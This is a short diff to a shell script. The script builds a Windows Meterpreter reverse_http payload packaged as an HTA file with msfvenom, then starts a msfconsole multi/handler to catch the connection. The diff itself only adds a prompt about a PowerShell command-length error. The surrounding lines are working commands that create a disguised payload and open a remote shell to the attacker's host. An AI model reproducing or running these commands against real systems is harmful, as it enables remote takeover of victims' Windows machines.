@@ -9,4 +9,6 @@ echo "[+] Did you copy the command? If yes, press enter to continue"
 read abc
 
 msfvenom -p windows/meterpreter/reverse_http LHOST=$ipaddr LPORT=8000 -f hta-psh | tee -a payload.hta
+echo "[+] Did you receive the error 'Powershell command length is greater than the commandline maximum'? If so, exit and start again"
+read def
 msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_http;set LHOST $ipaddr; set LPORT 8000; run"
